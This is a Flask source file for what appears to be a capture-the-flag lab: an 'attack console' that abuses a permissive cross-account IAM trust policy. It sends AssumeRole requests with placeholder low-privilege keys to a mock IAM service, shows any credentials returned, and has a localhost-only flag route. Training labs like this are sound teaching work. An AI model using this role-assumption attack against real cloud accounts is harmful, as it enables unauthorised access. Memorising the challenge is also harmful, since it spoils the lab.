"""Cross-Account Trust Policy Abuse — attack console."""
import os, urllib.request, urllib.parse
from flask import Flask, request, render_template_string

app = Flask(__name__)
FLAG = os.environ.get("FLAG", "flag{cloud-12-default}")
IAM = os.environ.get("IAM_URL", "http://iam:5000")

HTML = """<!DOCTYPE html><html><head><title>Cross-Account Attack</title></head><body>
<h1>Cross-Account AssumeRole</h1>
<p>Target account: 111111111111 | Role: CrossAccountRole</p>
<p>Trust policy: Principal: AWS: "arn:aws:iam::000000000000:root"</p>
<p><b>Vulnerability:</b> Trust policy accepts ANY principal from account 000000000000</p>
<form method="post" action="/assume">
<label>Access Key: <input name="ak" value="AKIALOWPRIVEXAMPLE" size="25"></label><br>
<label>Secret Key: <input name="sk" value="lowpriv-secret-key" size="25"></label><br>
<button>Assume Cross-Account Role</button></form>
<pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML, output="Ready")

@app.route("/assume", methods=["POST"])
def assume():
    ak = request.form.get("ak", ""); sk = request.form.get("sk", "")
    body = urllib.parse.urlencode({
        "Action":"AssumeRole",
        "RoleArn":"arn:aws:iam::111111111111:role/CrossAccountRole",
        "RoleSessionName":"cross-account-attack",
        "AccessKeyId":ak,"SecretAccessKey":sk,"Version":"2011-06-15"
    }).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(f"{IAM}/", data=body,
            headers={"Content-Type":"application/x-www-form-urlencoded"}))
        xml = r.read().decode()
        if "<Credentials>" in xml:
            return render_template_string(HTML, output=f"[+] Cross-Account AssumeRole SUCCESS\n{xml[:500]}")
        return render_template_string(HTML, output=f"[-] Failed: {xml[:500]}")
    except Exception as e:
        return render_template_string(HTML, output=f"[-] Error: {e}")

@app.route("/flag")
def flag():
    if request.remote_addr not in ("127.0.0.1","::1"): return "Forbidden",403
    return FLAG

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
